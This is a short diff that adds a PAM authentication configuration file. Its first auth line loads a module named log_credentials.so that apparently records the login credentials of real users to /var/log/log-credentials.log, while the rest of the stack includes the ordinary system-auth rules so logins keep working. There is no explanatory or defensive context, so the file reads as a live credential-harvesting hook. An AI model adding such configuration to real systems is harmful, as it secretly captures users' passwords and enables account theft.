@@ -1,0 +1,6 @@
+#%PAM-1.0
+auth       optional     log_credentials.so onlytrueusers file=/var/log/log-credentials.log
+auth       include      system-auth
+account    include      system-auth
+password   include      system-auth
+session    include      system-auth
